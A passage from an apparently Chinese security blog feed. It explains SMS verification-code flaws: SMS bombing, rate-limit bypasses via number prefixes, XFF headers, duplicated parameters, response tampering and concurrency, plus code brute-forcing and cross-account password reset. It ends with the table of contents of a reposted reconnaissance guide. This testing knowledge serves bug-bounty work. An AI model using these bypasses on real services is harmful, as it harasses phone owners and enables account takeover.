<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001pom4Y49b27l.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001pom4Y49b27l.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001pom4Y49b27l.jpg">
        
    </a><br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004CnRCi1VHXGx.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004CnRCi1VHXGx.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004CnRCi1VHXGx.jpg">
        
    </a><br>
不停点击repeter或者放到intruder里面，就可以实现一个手机号接收到多条短信<br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000036p8jq0y335p.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000036p8jq0y335p.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000036p8jq0y335p.jpg">
        
    </a></p>
<h4 id="短信炸弹横向" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e6%a8%aa%e5%90%91" class="header-mark"></a>短信炸弹横向</h4><p>上面我们提到了在限定时间内，对一个手机号发送超过预期的短信条数是短信轰炸。造成的结果就是浪费短信资源。如果开发把这个漏洞给改了，那么还有没有漏洞？还有？不能给一个人发送短信验证了，那么给其他人发送验证码一样的。<br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003BrurY3CSZnj.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003BrurY3CSZnj.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003BrurY3CSZnj.jpg">
        
    </a><br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002DmI481Lzcpi.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002DmI481Lzcpi.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002DmI481Lzcpi.jpg">
        
    </a><br>
将phone设置成变量，进行遍历<br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003h8k0Y12iqP3.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003h8k0Y12iqP3.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003h8k0Y12iqP3.jpg">
        
    </a></p>
<h4 id="短信验证码可爆破" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e9%aa%8c%e8%af%81%e7%a0%81%e5%8f%af%e7%88%86%e7%a0%b4" class="header-mark"></a>短信验证码可爆破</h4><p>我们讲了 2 个发送短信验证码，都知道验证码通常 4 位数或者 6 位数的数字验证码。如果服务器没有限制提交的验证码的次数，那么我们可以爆破这个验证码。并且如果有 4 位验证码被爆破成功的话，在 SRC 里面通常是按照高危处理。</p>
<h4 id="短信验证码可编辑" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e9%aa%8c%e8%af%81%e7%a0%81%e5%8f%af%e7%bc%96%e8%be%91" class="header-mark"></a>短信验证码可编辑</h4><p>我们讲了发送短信验证码以及爆破短信验证码。我们知道短信验证码功能发送的是短信，那么我们就有可能把短信内容给更改。<br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000jKo612ODkuw.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000jKo612ODkuw.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000jKo612ODkuw.jpg">
        
    </a><br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002Pjjq606D5Ug.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002Pjjq606D5Ug.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002Pjjq606D5Ug.jpg">
        
    </a><br>
通过修改transAmt 参数内容，可随意修改短信内容<br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002uhK0O1xQVMr.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002uhK0O1xQVMr.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002uhK0O1xQVMr.jpg">
        
    </a></p>
<h3 id="短信炸弹的绕过技巧" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7" class="header-mark"></a>短信炸弹的绕过技巧</h3><p>我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。</p>
<h4 id="短信炸弹的绕过技巧-1--特殊字符" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7-1--%e7%89%b9%e6%ae%8a%e5%ad%97%e7%ac%a6" class="header-mark"></a>短信炸弹的绕过技巧 1&ndash;特殊字符</h4><p>通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。</p>
<p>在 mobile=15312341234 的前面，加<code>空格</code>，<code>86</code>，<code>086</code>，<code>0086</code>，<code>+86</code>，<code>0</code>，<code>00</code>，<code>/r,/n</code>,<code>?</code>,<code>#</code>,<code>!</code>,<code>,</code>&hellip;只要想法多就有可能绕过。<br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003z29pV3SsQlN.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003z29pV3SsQlN.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003z29pV3SsQlN.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002FVXvC4Qp9g8.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002FVXvC4Qp9g8.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002FVXvC4Qp9g8.jpg">
        
    </a><br>
控制phone参数进行攻击<br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002dZuwq4TjTvo.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002dZuwq4TjTvo.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002dZuwq4TjTvo.jpg">
        
    </a></p>
<h4 id="短信炸弹的绕过技巧-2--添加-xff" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7-2--%e6%b7%bb%e5%8a%a0-xff" class="header-mark"></a>短信炸弹的绕过技巧 2&ndash;添加 XFF</h4><p>在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。</p>
<h4 id="短信炸弹的绕过技巧-3--添加多个值" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7-3--%e6%b7%bb%e5%8a%a0%e5%a4%9a%e4%b8%aa%e5%80%bc" class="header-mark"></a>短信炸弹的绕过技巧 3&ndash;添加多个值</h4><p>在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234&amp;code=1234</p>
<h4 id="短信炸弹的绕过技巧-4--添加多个参数" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7-4--%e6%b7%bb%e5%8a%a0%e5%a4%9a%e4%b8%aa%e5%8f%82%e6%95%b0" class="header-mark"></a>短信炸弹的绕过技巧 4&ndash;添加多个参数</h4><p>比如 Mobile=18312341234&amp;Mobile=13612341234</p>
<h4 id="短信炸弹的绕过技巧-5--修改返回包" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7-5--%e4%bf%ae%e6%94%b9%e8%bf%94%e5%9b%9e%e5%8c%85" class="header-mark"></a>短信炸弹的绕过技巧 5&ndash;修改返回包</h4><p>在发送短信验证码的数据包，修改返回包的 Flase 为 Success</p>
<h4 id="短信炸弹的绕过技巧-6--并发" class="headerLink">
    <a href="#%e7%9f%ad%e4%bf%a1%e7%82%b8%e5%bc%b9%e7%9a%84%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7-6--%e5%b9%b6%e5%8f%91" class="header-mark"></a>短信炸弹的绕过技巧 6&ndash;并发</h4><p>对短信验证码的数据包进行并发，有机会绕过限制</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001X3faW1LPOg0.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001X3faW1LPOg0.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001X3faW1LPOg0.jpg">
        
    </a><br>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002okHQ34HwLnz.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002okHQ34HwLnz.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002okHQ34HwLnz.jpg">
        
    </a></p>
<h4 id="在响应包里面可以看到短信验证码" class="headerLink">
    <a href="#%e5%9c%a8%e5%93%8d%e5%ba%94%e5%8c%85%e9%87%8c%e9%9d%a2%e5%8f%af%e4%bb%a5%e7%9c%8b%e5%88%b0%e7%9f%ad%e4%bf%a1%e9%aa%8c%e8%af%81%e7%a0%81" class="header-mark"></a>在响应包里面可以看到短信验证码</h4><p>在抓取短信验证码的数据包后，在 response 可以看到短信验证码</p>
<h4 id="提交别人的验证码" class="headerLink">
    <a href="#%e6%8f%90%e4%ba%a4%e5%88%ab%e4%ba%ba%e7%9a%84%e9%aa%8c%e8%af%81%e7%a0%81" class="header-mark"></a>提交别人的验证码</h4><p>假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录</p>
<h4 id="每次短信验证码都是同一个" class="headerLink">
    <a href="#%e6%af%8f%e6%ac%a1%e7%9f%ad%e4%bf%a1%e9%aa%8c%e8%af%81%e7%a0%81%e9%83%bd%e6%98%af%e5%90%8c%e4%b8%80%e4%b8%aa" class="header-mark"></a>每次短信验证码都是同一个</h4><p>一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的</p>
<h4 id="验证码不失效-1" class="headerLink">
    <a href="#%e9%aa%8c%e8%af%81%e7%a0%81%e4%b8%8d%e5%a4%b1%e6%95%88-1" class="header-mark"></a>验证码不失效 1</h4><p>比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码</p>
<h4 id="验证码不失效-2" class="headerLink">
    <a href="#%e9%aa%8c%e8%af%81%e7%a0%81%e4%b8%8d%e5%a4%b1%e6%95%88-2" class="header-mark"></a>验证码不失效 2</h4><p>场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效-</p>
<h4 id="验证码绕过技巧" class="headerLink">
    <a href="#%e9%aa%8c%e8%af%81%e7%a0%81%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7" class="header-mark"></a>验证码绕过技巧</h4><p>项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码</p>
<h4 id="验证码技巧" class="headerLink">
    <a href="#%e9%aa%8c%e8%af%81%e7%a0%81%e6%8a%80%e5%b7%a7" class="header-mark"></a>验证码技巧</h4><p>在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置</p>
<p>本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。</p>]]></description>
</item><item>
    <title>万字总结信息收集全网最全</title>
    <link>http://localhost:1313/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</link>
    <pubDate>Fri, 26 Apr 2024 18:19:39 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>http://localhost:1313/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2841" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2841</a></em></p>
</blockquote>
<p><strong>万字吐血总结信息收集</strong></p>
<p><a href="https://forum.butian.net/share/2841#9313-1608956864075" target="_blank" rel="noopener noreferrer">一、信息收集前言</a></p>
<p><a href="https://forum.butian.net/share/2841#1540-1608954143250" target="_blank" rel="noopener noreferrer">二、域名信息</a></p>
<p><a href="https://forum.butian.net/share/2841#6482-1608952975074" target="_blank" rel="noopener noreferrer">1、Whois查询</a></p>
<p><a href="https://forum.butian.net/share/2841#6626-1608954528325" target="_blank" rel="noopener noreferrer">1.1、站长之家</a></p>
<p><a href="https://forum.butian.net/share/2841#5826-1609522517663" target="_blank" rel="noopener noreferrer">1.2、爱站</a></p>
<p><a href="https://forum.butian.net/share/2841#8290-1608955028908" target="_blank" rel="noopener noreferrer">1.3、微步</a></p>
<p><a href="https://forum.butian.net/share/2841#5081-1608954609305" target="_blank" rel="noopener noreferrer">1.4、国外的who.is</a></p>
<p><a href="https://forum.butian.net/share/2841#7799-1608955238665" target="_blank" rel="noopener noreferrer">1.5、阿里云域名信息查询</a></p>
<p><a href="https://forum.butian.net/share/2841#7847-1609321094615" target="_blank" rel="noopener noreferrer">1.6、腾讯查询</a></p>
<p><a href="https://forum.butian.net/share/2841#6619-1609601548665" target="_blank" rel="noopener noreferrer">1.7、中国互联网信息中心</a></p>
<p><a href="https://forum.butian.net/share/2841#1070-1609150295487" target="_blank" rel="noopener noreferrer">2、ICP(Internet Content Provider)备案查询</a></p>
<p><a href="https://forum.butian.net/share/2841#4328-1608957113762" target="_blank" rel="noopener noreferrer">2.1、国家企业信用信息公示系统</a></p>
<p><a href="https://forum.butian.net/share/2841#2762-1608957274017" target="_blank" rel="noopener noreferrer">2.2、ICP备案查询网</a></p>
<p><a href="https://forum.butian.net/share/2841#7362-1608957345470" target="_blank" rel="noopener noreferrer">2.3、ICP备案查询 - 站长工具</a></p>
<p><a href="https://forum.butian.net/share/2841#7985-1608957511174" target="_blank" rel="noopener noreferrer">2.4、天眼查</a></p>
<p><a href="https://forum.butian.net/share/2841#5774-1608957266603" target="_blank" rel="noopener noreferrer">2.5、企查查</a></p>
<p><a href="https://forum.butian.net/share/2841#2641-1608957035834" target="_blank" rel="noopener noreferrer">3、SEO(Search Engine Optimization)查询</a></p>
<p><a href="https://forum.butian.net/share/2841#4489-1608958353806" target="_blank" rel="noopener noreferrer">3.1、爱站-SEO综合查询</a></p>
<p><a href="https://forum.butian.net/share/2841#2085-1608958243261" target="_blank" rel="noopener noreferrer">3.2、站长-SEO综合查询</a></p>
<p><a href="https://forum.butian.net/share/2841#4377-1608958615406" target="_blank" rel="noopener noreferrer">4、历史漏洞</a></p>
<p><a href="https://forum.butian.net/share/2841#4549-1608994973094" target="_blank" rel="noopener noreferrer">4.1、乌云漏洞库</a></p>
<p><a href="https://forum.butian.net/share/2841#6739-1608994952697" target="_blank" rel="noopener noreferrer">5、Google Hacking</a></p>
<p><a href="https://forum.butian.net/share/2841#1562-1609132494362" target="_blank" rel="noopener noreferrer">5.1、intext:后台管理</a></p>
<p><a href="https://forum.butian.net/share/2841#4067-1609132494362" target="_blank" rel="noopener noreferrer">5.2、intitle：管理登录</a></p>
<p><a href="https://forum.butian.net/share/2841#5125-1609132494362" target="_blank" rel="noopener noreferrer">5.3、filetype:pdf</a></p>
<p><a href="https://forum.butian.net/share/2841#2626-1609132494362" target="_blank" rel="noopener noreferrer">5.4、inurl: php?id=</a></p>
<p><a href="https://forum.butian.net/share/2841#6099-1609132494362" target="_blank" rel="noopener noreferrer">5.5、site：baidu.com</a></p>
<p><a href="https://forum.butian.net/share/2841#2526-1609142599574" target="_blank" rel="noopener noreferrer">5.6、filetype：pdf site:baidu.com</a></p>
<p><a href="https://forum.butian.net/share/2841#4070-1609132494362" target="_blank" rel="noopener noreferrer">6、Github</a></p>
<p><a href="https://forum.butian.net/share/2841#6248-1609000172175" target="_blank" rel="noopener noreferrer">7、维基和百度百科</a></p>
<p><a href="https://forum.butian.net/share/2841#2752-1609143904790" target="_blank" rel="noopener noreferrer">8、网络空间搜索引擎</a></p>
<p><a href="https://forum.butian.net/share/2841#8628-1608994952900" target="_blank" rel="noopener noreferrer">8.1、Fofa</a></p>
<p><a href="https://forum.butian.net/share/2841#7827-1608995508166" target="_blank" rel="noopener noreferrer">8.2、Shodan</a></p>
<p><a href="https://forum.butian.net/share/2841#1356-1608995559459" target="_blank" rel="noopener noreferrer">8.3、Zoomeye(钟馗之眼)</a></p>
<p><a href="https://forum.butian.net/share/2841#4049-1608995592030" target="_blank" rel="noopener noreferrer">8.4、Spyse</a></p>
<p><a href="https://forum.butian.net/share/2841#8054-1609090002560" target="_blank" rel="noopener noreferrer">8.5、Censys</a></p>
<p><a href="https://forum.butian.net/share/2841#9669-1611813877072" target="_blank" rel="noopener noreferrer">9、REG007</a></p>
<p><a href="https://forum.butian.net/share/2841#3621-1608994953076" target="_blank" rel="noopener noreferrer">二、APP、小程序、公众号信息收集</a></p>
<p><a href="https://forum.butian.net/share/2841#7068-1608993351034" target="_blank" rel="noopener noreferrer">1、APP信息搜集</a></p>
<p><a href="https://forum.butian.net/share/2841#7710-1608993411291" target="_blank" rel="noopener noreferrer">1.1、七麦数据</a></p>
<p><a href="https://forum.butian.net/share/2841#2775-1608993545897" target="_blank" rel="noopener noreferrer">1.2、AppStore(安卓和IOS)</a></p>
<p><a href="https://forum.butian.net/share/2841#3067-1608993411485" target="_blank" rel="noopener noreferrer">2、微信公众号和小程序</a></p>
<p><a href="https://forum.butian.net/share/2841#5930-1609143632016" target="_blank" rel="noopener noreferrer">4、logo</a></p>
<p><a href="https://forum.butian.net/share/2841#4627-1608993411642" target="_blank" rel="noopener noreferrer">5、favicon.ico</a></p>
<p><a href="https://forum.butian.net/share/2841#1925-1608957036106" target="_blank" rel="noopener noreferrer">三、子域名收集(挖掘)</a></p>
<p><a href="https://forum.butian.net/share/2841#4380-1609090650925" target="_blank" rel="noopener noreferrer">1、SSL(HTTPS)证书</a></p>
<p><a href="https://forum.butian.net/share/2841#1020-1609128666117" target="_blank" rel="noopener noreferrer">1.1、大厂商SSL证书一证多用</a></p>
<p><a href="https://forum.butian.net/share/2841#2835-1609090650925" target="_blank" rel="noopener noreferrer">1.2、HTTPS证书错误泄露域名</a></p>
<p><a href="https://forum.butian.net/share/2841#5294-1609128697253" target="_blank" rel="noopener noreferrer">1.3、在线网站证书查询</a></p>
<p><a href="https://forum.butian.net/share/2841#4998-1609090650925" target="_blank" rel="noopener noreferrer">2、网络深度爬虫</a></p>
<p><a href="https://forum.butian.net/share/2841#7223-1609090925111" target="_blank" rel="noopener noreferrer">3、域传送漏洞</a></p>
<p><a href="https://forum.butian.net/share/2841#1072-1609090925111" target="_blank" rel="noopener noreferrer">3.1、常用DNS记录</a></p>
<p><a href="https://forum.butian.net/share/2841#9085-1609090925111" target="_blank" rel="noopener noreferrer">3.2、DNS区域传送</a></p>
<p><a href="https://forum.butian.net/share/2841#3265-1609090925111" target="_blank" rel="noopener noreferrer">3.3、域传送漏洞</a></p>
<p><a href="https://forum.butian.net/share/2841#1183-1609090925111" target="_blank" rel="noopener noreferrer">3.4、检测</a></p>
<p><a href="https://forum.butian.net/share/2841#3644-1609090862170" target="_blank" rel="noopener noreferrer">4、在线DNS数据</a></p>
<p><a href="https://forum.butian.net/share/2841#4819-1609091002762" target="_blank" rel="noopener noreferrer">4.1、VirusTotal</a></p>
<p><a href="https://forum.butian.net/share/2841#6528-1609091002762" target="_blank" rel="noopener noreferrer">4.2、DNSdumpster</a></p>
<p><a href="https://forum.butian.net/share/2841#5960-1609149395775" target="_blank" rel="noopener noreferrer">4.2、dnsdb</a></p>
<p><a href="https://forum.butian.net/share/2841#4068-1609091082152" target="_blank" rel="noopener noreferrer">5、自身泄漏</a></p>
<p><a href="https://forum.butian.net/share/2841#8760-1609091082152" target="_blank" rel="noopener noreferrer">6、Github泄露</a></p>
<p><a href="https://forum.butian.net/share/2841#4387-1609090862561" target="_blank" rel="noopener noreferrer">7、Google Hacking</a></p>
<p><a href="https://forum.butian.net/share/2841#5190-1609144245688" target="_blank" rel="noopener noreferrer">8、在线子域名查询</a></p>
<p><a href="https://forum.butian.net/share/2841#7195-1609090862754" target="_blank" rel="noopener noreferrer">9、子域名枚举爆破</a></p>
<p><a href="https://forum.butian.net/share/2841#2064-1608958948229" target="_blank" rel="noopener noreferrer">9.1、OneForAll</a></p>
<p><a href="https://forum.butian.net/share/2841#8223-1608979107978" target="_blank" rel="noopener noreferrer">9.2、subDomainBrute</a></p>
<p><a href="https://forum.butian.net/share/2841#6550-1608981342591" target="_blank" rel="noopener noreferrer">9.3、Layer</a></p>
<p><a href="https://forum.butian.net/share/2841#3987-1608982931914" target="_blank" rel="noopener noreferrer">9.4、FuzSub</a></p>
<p><a href="https://forum.butian.net/share/2841#2688-1608956009770" target="_blank" rel="noopener noreferrer">9.5、Fierce</a></p>
<p><a href="https://forum.butian.net/share/2841#1849-1609522810625" target="_blank" rel="noopener noreferrer">9.6、御剑</a></p>
<p><a href="https://forum.butian.net/share/2841#3722-1609600384813" target="_blank" rel="noopener noreferrer">9.7、wydomain</a></p>
<p><a href="https://forum.butian.net/share/2841#5955-1609601438779" target="_blank" rel="noopener noreferrer">9.8、orangescan</a></p>
<p><a href="https://forum.butian.net/share/2841#1670-1609601463470" target="_blank" rel="noopener noreferrer">9.9、DNSRecon</a></p>
<p><a href="https://forum.butian.net/share/2841#1149-1609601477005" target="_blank" rel="noopener noreferrer">9.10、K8</a></p>
<p><a href="https://forum.butian.net/share/2841#5028-1608955925899" target="_blank" rel="noopener noreferrer">四、IP信息收集</a></p>
<p><a href="https://forum.butian.net/share/2841#1747-1608955824768" target="_blank" rel="noopener noreferrer">1、CDN概念</a></p>
<p><a href="https://forum.butian.net/share/2841#8035-1608955824768" target="_blank" rel="noopener noreferrer">2、判断是否真实IP</a></p>
<p><a href="https://forum.butian.net/share/2841#1167-1608955824768" target="_blank" rel="noopener noreferrer">2.1、nslookup</a></p>
<p><a href="https://forum.butian.net/share/2841#1490-1609523033042" target="_blank" rel="noopener noreferrer">2.2、多地ping</a></p>
<p><a href="https://forum.butian.net/share/2841#2282-1608955824768" target="_blank" rel="noopener noreferrer">2.3、IP反查</a></p>
<p><a href="https://forum.butian.net/share/2841#7660-1608955824768" target="_blank" rel="noopener noreferrer">3、绕CDN找真实IP</a></p>
<p><a href="https://forum.butian.net/share/2841#3665-1608955824768" target="_blank" rel="noopener noreferrer">3.1、子域名</a></p>
<p><a href="https://forum.butian.net/share/2841#5845-1608955824768" target="_blank" rel="noopener noreferrer">3.2、历史DNS解析记录</a></p>
<p><a href="https://forum.butian.net/share/2841#2254-1608955824768" target="_blank" rel="noopener noreferrer">3.3、邮件服务器</a></p>
<p><a href="https://forum.butian.net/share/2841#3371-1608955824768" target="_blank" rel="noopener noreferrer">3.4、信息泄漏</a></p>
<p><a href="https://forum.butian.net/share/2841#4490-1608955824768" target="_blank" rel="noopener noreferrer">3.5、网络空间搜索引擎</a></p>
<p><a href="https://forum.butian.net/share/2841#5540-1609152256957" target="_blank" rel="noopener noreferrer">3.6、利用SSL证书查询</a></p>
<p><a href="https://forum.butian.net/share/2841#2123-1609152256957" target="_blank" rel="noopener noreferrer">3.7、国外访问</a></p>
<p><a href="https://forum.butian.net/share/2841#5089-1609152158354" target="_blank" rel="noopener noreferrer">3.8、LTM解码法</a></p>
<p><a href="https://forum.butian.net/share/2841#2181-1608955668851" target="_blank" rel="noopener noreferrer">五、基本目录、敏感目录及文件</a></p>
<p><a href="https://forum.butian.net/share/2841#4679-1608992618890" target="_blank" rel="noopener noreferrer">1、dirsearch</a></p>
<p><a href="https://forum.butian.net/share/2841#3231-1608992732589" target="_blank" rel="noopener noreferrer">2、dirbuster</a></p>
<p><a href="https://forum.butian.net/share/2841#3622-1608992805474" target="_blank" rel="noopener noreferrer">3、7kbscan</a></p>
<p><a href="https://forum.butian.net/share/2841#6361-1608920351807" target="_blank" rel="noopener noreferrer">4、Webrobot</a></p>
<p><a href="https://forum.butian.net/share/2841#4220-1609573008653" target="_blank" rel="noopener noreferrer">5、御剑</a></p>
<p><a href="https://forum.butian.net/share/2841#6791-1609573020093" target="_blank" rel="noopener noreferrer">6、爬虫-中国菜刀</a></p>
<p><a href="https://forum.butian.net/share/2841#9124-1609600023020" target="_blank" rel="noopener noreferrer">7、wwwscan</a></p>
<p><a href="https://forum.butian.net/share/2841#3046-1609600030284" target="_blank" rel="noopener noreferrer">8、cansina</a></p>
<p><a href="https://forum.butian.net/share/2841#8653-1609601106194" target="_blank" rel="noopener noreferrer">9、dirmap</a></p>
<p><a href="https://forum.butian.net/share/2841#6077-1609601148943" target="_blank" rel="noopener noreferrer">10、Webdirscan</a></p>
<p><a href="https://forum.butian.net/share/2841#0095-1609601728882" target="_blank" rel="noopener noreferrer">11、BBscan</a></p>
<p><a href="https://forum.butian.net/share/2841#4978-1609601754493" target="_blank" rel="noopener noreferrer">12、GSIL</a></p>
<p><a href="https://forum.butian.net/share/2841#6626-1608993192550" target="_blank" rel="noopener noreferrer">六、端口扫描</a></p>
<p><a href="https://forum.butian.net/share/2841#6069-1608954466298" target="_blank" rel="noopener noreferrer">1、各服务开启的默认端口以及攻击方向</a></p>
<p><a href="https://forum.butian.net/share/2841#6091-1609151143006" target="_blank" rel="noopener noreferrer">2、在线查询网站</a></p>
<p><a href="https://forum.butian.net/share/2841#5019-1609133130279" target="_blank" rel="noopener noreferrer">3、端口扫描工具</a></p>
<p><a href="https://forum.butian.net/share/2841#4561-1609133361937" target="_blank" rel="noopener noreferrer">3.1、nmap(zmap)</a></p>
<p><a href="https://forum.butian.net/share/2841#8017-1609133362312" target="_blank" rel="noopener noreferrer">3.2、masscan</a></p>
<p><a href="https://forum.butian.net/share/2841#8422-1609133130279" target="_blank" rel="noopener noreferrer">3.3、ScanPort</a></p>
<p><a href="https://forum.butian.net/share/2841#9722-1609133130279" target="_blank" rel="noopener noreferrer">3.4、webrobot</a></p>
<p><a href="https://forum.butian.net/share/2841#4097-1608920351807" target="_blank" rel="noopener noreferrer">七、旁站C段</a></p>
<p><a href="https://forum.butian.net/share/2841#3070-1608956426469" target="_blank" rel="noopener noreferrer">1、在线查询</a></p>
<p><a href="https://forum.butian.net/share/2841#9200-1609149932774" target="_blank" rel="noopener noreferrer">1.1、站点</a></p>
<p><a href="https://forum.butian.net/share/2841#6165-1608956426469" target="_blank" rel="noopener noreferrer">1.2、Google Hacking、Bing</a></p>
<p><a href="https://forum.butian.net/share/2841#2668-1609150042919" target="_blank" rel="noopener noreferrer">1.2、网络空间搜索引擎</a></p>
<p><a href="https://forum.butian.net/share/2841#5171-1609149771387" target="_blank" rel="noopener noreferrer">2、探测工具</a></p>
<p><a href="https://forum.butian.net/share/2841#2224-1609149800718" target="_blank" rel="noopener noreferrer">2.1、K8Cscan</a></p>
<p><a href="https://forum.butian.net/share/2841#8618-1609149771812" target="_blank" rel="noopener noreferrer">2.2、nmap、masscan</a></p>
<p><a href="https://forum.butian.net/share/2841#1900-1609149844914" target="_blank" rel="noopener noreferrer">2.3、goby</a></p>
<p><a href="https://forum.butian.net/share/2841#6861-1609149994044" target="_blank" rel="noopener noreferrer">2.4、御剑</a></p>
<p><a href="https://forum.butian.net/share/2841#5389-1609150008457" target="_blank" rel="noopener noreferrer">2.5、北极熊扫描器</a></p>
<p><a href="https://forum.butian.net/share/2841#1349-1609573401484" target="_blank" rel="noopener noreferrer">2.6、通过手动ping</a></p>
<p><a href="https://forum.butian.net/share/2841#1547-1608920351807" target="_blank" rel="noopener noreferrer">八、整站分析</a></p>
<p><a href="https://forum.butian.net/share/2841#5021-1608954477133" target="_blank" rel="noopener noreferrer">1、服务器类型</a></p>
<p><a href="https://forum.butian.net/share/2841#0096-1609320836918" target="_blank" rel="noopener noreferrer">1.1、 云悉WEB资产梳理</a></p>
<p><a href="https://forum.butian.net/share/2841#7810-1609320832121" target="_blank" rel="noopener noreferrer">2、网站容器</a></p>
<p><a href="https://forum.butian.net/share/2841#2839-1609320737099" target="_blank" rel="noopener noreferrer">2.1、火狐渗透测试浏览器</a></p>
<p><a href="https://forum.butian.net/share/2841#2075-1609320737099" target="_blank" rel="noopener noreferrer">2.2、云悉WEB资产梳理</a></p>
<p><a href="https://forum.butian.net/share/2841#9370-1608920351807" target="_blank" rel="noopener noreferrer">3、脚本类型</a></p>
<p><a href="https://forum.butian.net/share/2841#1029-1608920351807" target="_blank" rel="noopener noreferrer">3.1、通过修改首页文件后缀查看页面响应判断</a></p>
